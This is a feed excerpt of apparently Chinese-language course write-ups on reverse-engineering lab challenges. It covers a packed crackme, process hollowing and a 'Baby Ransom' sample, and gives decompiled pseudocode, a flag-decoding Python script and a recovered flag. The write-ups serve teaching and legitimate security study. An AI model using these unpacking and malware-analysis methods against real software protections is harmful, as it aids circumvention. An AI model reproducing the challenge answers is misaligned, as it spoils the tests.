先用DIE看一些資訊 發現有加UPX的殼，這件事情可以透過IDA更加確定 可以看到Function Name只有start然後反組譯的地方看起來很噁心，那應該就是在拆殼的步驟 先執行看看 需要輸入flag然後用一個message box噴錯 用x64-dbg 透過TA的講解，可以知道這一題不需要解殼，只需要用動態debugger看一下就可以了 我們知道題目有使用到message box的API，所以我們可以先鎖定該API在哪邊呼叫，再往回trace出他的判斷 我們可以利用符號的視窗看到這支程式有用到那些API Module(.dll)，而message box的API是在user32.dll，用下面的搜尋可以縮小範圍，但這個多種類的messagebox，具體來說是用哪一個也不知道，所以可以全選後都設立中斷點 剩下的就是跟一般debugger差不多的操作，當追到call messagebox之前的break point時，可以看一下call stack(呼叫堆疊)往前trace是誰呼叫了API，發現是00C7110B，點進去看一下可以明顯看到Correct/Wrong的字樣，所以可以判斷應該是這一段程式在判斷我們輸入的東西 分析判斷的程式 這裡就是要考驗耐心和不斷的觀察register的變化，認真看大概花個半小時就可以知道這一段在幹嘛(我就菜QAQ) 結論是中間的那些==重要的操作==其實就是左旋轉+XOR 0x87這樣而已，所以我們就可以開寫腳本了，把東西反著作回去就好了 Exploit import binascii enc_flag = [0xB5, 0xE5, 0x8D, 0xBD, 0x5C, 0x46, 0x36, 0x4E, 0x4E, 0x1E, 0x0E, 0x26, 0xA4, 0x1E, 0x0E, 0x4E, 0x46, 0x06, 0x16, 0xAC, 0xB4, 0x3E, 0x4E, 0x16, 0x94, 0x3E, 0x94, 0x8C, 0x94, 0x8C, 0x9C, 0x4E, 0xA4, 0x8C, 0x2E, 0x46, 0x8C, 0x6C] def pad(m): length = 0 if len(m) % 8 != 0: length = 8-len(m) % 8 return '0' * length + m FLAG = [] for i in range(len(enc_flag)): enc_flag[i] ^= 0x87 tmp = pad(bin(enc_flag[i])[2:]) tmp = hex(int(tmp[-3:] + tmp[:-3], 2)) FLAG.append(binascii.unhexlify(tmp[2:]).decode()) print("".join(FLAG)) Flag: FLAG{8699314d319802ef792b7babac9da58a}</description></item><item><title>Simple Reverse 0x08(Lab - GetProcAddress)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x08lab---getprocaddress/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x08lab---getprocaddress/index.html</guid><description>Simple Reverse 0x08(Lab - GetProcAddress) Background GetModuleFileNameA 函式 createFileA 函式 setFilePointer 函式 ReadFile 函式
Source Code :::spoiler IDA main function
int __cdecl main(int argc, const char **argv, const char **envp) { char *v3; // rdi __int64 i; // rcx char v6[32]; // [rsp+0h] [rbp-40h] BYREF char v7; // [rsp+40h] [rbp+0h] BYREF char lpFilename[304]; // [rsp+50h] [rbp+10h] BYREF char lpBuffer[136]; // [rsp+180h] [rbp+140h] BYREF char flag[64]; // [rsp+208h] [rbp+1C8h] BYREF __int64 File_HANDLE_VALUE; // [rsp+248h] [rbp+208h] int j; // [rsp+264h] [rbp+224h] v3 = &amp;v7; for ( i = 146i64; i; --i ) { *v3 = 0xCCCCCCCC; v3 += 4; } sub_140011375(&amp;unk_1400230B5); sub_1400113AC(); printf("Give me flag: "); scanf("%39s", flag); (GetModuleFileNameA_0)(0i64, lpFilename, 260i64); File_HANDLE_VALUE = (CreateFileA)( lpFilename, 0x80000000i64, FILE_SHARE_READ, 0i64, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0i64); if ( File_HANDLE_VALUE == -1 || ((SetFilePointer)(File_HANDLE_VALUE, 0x4Ei64, 0i64, FILE_BEGIN), !(ReadFile)(File_HANDLE_VALUE, lpBuffer, 39i64, 0i64, 0i64)) ) { LABEL_11: puts("Wrong..."); } else { for ( j = 0; j &lt; 39; ++j ) { if ( (flag[j] ^ lpBuffer[j]) != byte_14001E000[8 * j] ) goto LABEL_11; } puts("Correct!!!"); } sub_140011311(v6, &amp;unk_14001BB18); return 0; } :::</description></item><item><title>Simple Reverse 0x11(Lab - Exception)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x11lab---exception/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x11lab---exception/index.html</guid><description>Simple Reverse 0x11(Lab - Exception) Background 乘法、除法的運用 — 組合語言筆記 try-except 陳述式
EXCEPTION_CONTINUE_EXECUTION (-1) 例外狀況已關閉。 在例外狀況發生的位置繼續執行。 EXCEPTION_CONTINUE_SEARCH 無法辨識 (0) 例外狀況。 繼續搜尋處理常式的堆疊，先搜尋包含 try-except 語句，然後針對具有下一個最高優先順序的處理常式。 EXCEPTION_EXECUTE_HANDLER 辨識 (1) 例外狀況。 藉由執行 __except 複合陳述式將控制權傳送至例外狀況處理常式，然後在 區塊之後 __except 繼續執行。 Source Code :::spoiler IDA Psuedo Code
int __cdecl main(int argc, const char **argv, const char **envp) { char Str[112]; // [rsp+20h] [rbp+0h] BYREF int i; // [rsp+A0h] [rbp+80h] printf("Give me flag: "); scanf("%s", Str); if ( strlen(Str) == 38 ) { for ( i = 0; i &lt; 38; ++i ) { if ( Str[i] != byte_14000A000[i] ) goto LABEL_7; } puts("Correct :>"); } else { LABEL_7: puts("Wrong :&lt;"); } return 0; } :::</description></item><item><title>Simple Reverse 0x12(Lab - TLSCallback)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x12lab---tlscallback/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x12lab---tlscallback/index.html</guid><description>Simple Reverse 0x12(Lab - TLSCallback) Background 課程相關影片 [C語言] function pointer的應用[四]: function pointer array
Source Code :::spoiler IDA main function
int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rbx int v4; // edi __int64 v5; // r14 char *v6; // rsi __int64 v7; // rax const char *v8; // rcx printf("Give me flag: "); scanf("%58s"); v3 = 0i64; v4 = 0; v5 = 0i64; v6 = flag; do { (funcs_140001156[v4 % 3u])(&amp;flag[v5]); ++v6; v7 = v5 &amp; 3; ++v4; ++v5; *(v6 - 1) += key_140004050[v7]; } while ( v4 &lt; 58 ); while ( flag[v3] == byte_1400022B8[v3] ) { if ( ++v3 >= 58 ) { v8 = "Correct!"; goto LABEL_7; } } v8 = "Wrong QAO"; LABEL_7: puts(v8); return 0; } :::</description></item><item><title>Simple Reverse 0x13(Lab - Meow)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x13lab---meow/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x13lab---meow/index.html</guid><description>Simple Reverse 0x13(Lab - Meow) Background 課程影片 - Process Injection 一開始看真的看不太懂，只知道大概的邏輯，簡單來說應該是在原有的process中插入其他的process使其被執行，有以下幾種
DLL Injection APC Injection Early Bird APC Injection Process Hollowing Reflective DLL Injection Recon 其實這一題如果沒有TA先破哏，基本上我是直接放棄的，解題之前可以先看破哏教學 簡單來說這整支程式就是先把預先藏好的code解密出來，然後利用Process Hollowing的方式inject到原本的程式，而這支外插進來的code就會對我們輸入的flag進行一些操作，然後再跟他原本的encrypted flag進行比較。當我們知道這些事情之後，就可以開始分析了
先在IDA中找到隱藏的code解密的function 我是直接看TA教學的部分，不然我應該也找不出來，除非用x64dbg慢慢跟，具體來說是在main function中if statement的第二個function 跟進去後的sub_401550() :::spoiler Decrypt Hidden Code
__int64 sub_401550() { __int64 result; // rax unsigned int i; // [rsp+Ch] [rbp-4h] for ( i = 0; ; ++i ) { result = i; if ( i > 0x3FFF ) break; *(dword_404040 + i) += i % 7; *(dword_404040 + i) ^= byte_404020[i &amp; 7]; } return result; } :::</description></item><item><title>Simple Reverse 0x30(2023 HW - Baby Ransom 1)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x302023-hw---baby-ransom-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x302023-hw---baby-ransom-1/index.html</guid><description>Simple Reverse 0x30(2023 HW - Baby Ransom 1) Background VirtualProtect 函式 記憶體保護常數 InternetOpenUrlA 函式 SetFileAttributesW 函式 Schtasks 工作排程 IsDebuggerPresent 函式 FindResourceA 函式 LoadResource 函式
Source code :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND] StackBase = NtCurrentTeb()->NtTib.StackBase; while ( 1 ) { DestInitValue = _InterlockedCompareExchange64(&amp;qword_140017050, StackBase, 0i64); if ( !DestInitValue ) { v5 = 0; goto LABEL_7; } if ( StackBase == DestInitValue ) break; Sleep(1000u); } v5 = 1; LABEL_7: if ( unk_140017058 == 1 ) { amsg_exit(31i64); } else if ( unk_140017058 ) { dword_140017008 = 1; } else { unk_140017058 = 1; initterm(&amp;qword_140019018, qword_140019028); } if ( unk_140017058 == 1 ) { initterm(&amp;qword_140019000, &amp;qword_140019010); unk_140017058 = 2; } if ( !v5 ) _InterlockedExchange64(&amp;qword_140017050, 0i64); if ( TlsCallback_0 ) TlsCallback_0(0i64, 2); sub_14000226B(); v6 = 0i64; qword_1400170E0 = SetUnhandledExceptionFilter(&amp;loc_140002530); (InterlockedExchange64)(nullsub_1); InitFloatUnit(); v7 = dword_140017028; space = malloc(8i64 * (dword_140017028 + 1)); v9 = qword_140017020; space_cp = space; while ( v7 > v6 ) { size = strlen(*(v9 + 8 * v6)) + 1; dest = malloc(size); *(space_cp + 8 * v6) = dest; src = *(v9 + 8 * v6++); qmemcpy(dest, src, size); } qword_140017020 = space_cp; if ( v7 &lt; 0 ) v7 = 0i64; *(space_cp + 8 * v7) = 0i64; sub_140001F1E(); _initenv = qword_140017018; dword_140017010 = (NetworkConfig_1DBB)(dword_140017028, qword_140017020);// 0x140017020 => 0x254CA9C1580 if ( !dword_14001700C ) exit(dword_140017010); if ( !dword_140017008 ) cexit(); return dword_140017010; } ::: :::spoiler IDA NetworkConfig_1DBB</description></item><item><title>Simple Reverse 0x31(2023 HW - Baby Ransom 2)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/index.html</guid><description>Simple Reverse 0x31(2023 HW - Baby Ransom 2) Background SystemFunction033 Source code :::spoiler IDA WinMain
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) { HWND hWnd; // [rsp+60h] [rbp-A8h] WNDCLASSW WndClass; // [rsp+70h] [rbp-98h] BYREF struct tagMSG Msg; // [rsp+C0h] [rbp-48h] BYREF memset(&amp;WndClass, 0, sizeof(WndClass)); WndClass.lpfnWndProc = (WNDPROC)store_winword; WndClass.hInstance = hInstance; WndClass.lpszClassName = Caption; WndClass.hbrBackground = CreateSolidBrush(0); if ( !RegisterClassW(&amp;WndClass) ) return 1; hWnd = CreateWindowExW(0, Caption, Caption, 0xCF0000u, 100, 100, 800, 600, 0i64, 0i64, hInstance, 0i64); if ( !hWnd ) return 2; MainPayload(); ShowWindow(hWnd, nShowCmd); memset(&amp;Msg, 0, sizeof(Msg)); while ( GetMessageW(&amp;Msg, 0i64, 0, 0) ) { TranslateMessage(&amp;Msg); DispatchMessageW(&amp;Msg); } return 0; } ::: :::spoiler IDA MainPayload</description></item><item><title>Simple Welcome 0x02 &amp; 0x05(Lab - Nine &amp; Nine-Revenge)</title><link>https://bernie6401.github.io/security/course/ntu-cs/welcome/simple-welcome-0x02--0x05lab---nine--nine-revenge/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/welcome/simple-welcome-0x02--0x05lab---nine--nine-revenge/index.html</guid><description>Simple Welcome 0x02 &amp; 0x05(Lab - Nine &amp; Nine-Revenge) Background Convert.FromBase64String(String) Method in C# String.Substring 方法
Source Code :::spoiler C# From dnSpy
// Nine.Stage // Token: 0x0600000D RID: 13 RVA: 0x00002694 File Offset: 0x00000894 private void Flag() { this.font = new Font(this.fontFamily, 35f, FontStyle.Regular); byte[] array = Convert.FromBase64String("LwcvGwpuiPzT7+LY9PPo6eLpuiY7vTY6ejz2OH1pui5uDu6+LY5unpui+6uj14qmpuipqfo=".Replace("pui", "").Substring(1)); for (int i = 0; i &lt; array.Length; i++) { array[i] ^= 135; } this.SetMessageBox(Encoding.UTF8.GetString(array)); } :::
Recon 起手式一定用DIE或其他檢測tool看一下是用哪種東西編譯或有沒有加殼 我一開始以為可以用IDA之類的東西反編譯他，但是顯然IDA沒辦法解析.NET file，這一題也是看了別人的WP1才知道有dnSpy這東西可以用 執行程式 實際執行起來會發現它就是個小遊戲，可以用方向鍵操控人移動或是移開石頭，重點是要拿到鑰匙並開鎖拿到旗子，玩了好久都沒成功，所以想說可以用dnSpy看一下可以用的東西 用dnSpy看source code 在/Nine/Nine.exe/Nine/Stage@02000004/Flag()以及/Nine-revenge/Nine-revenge.exe/Nine/Stage@02000004/Flag()都可以直接看到flag function怎麼寫的，所以其實這一題只要知道dnSpy這東西，其實就過於簡單 :::spoiler Function Path Screenshot ::: Exploit 也是可以直接用C#的線上editor，不過如果不會寫的話就可以直接看source code然後用熟悉的語言寫script</description></item></channel></rss>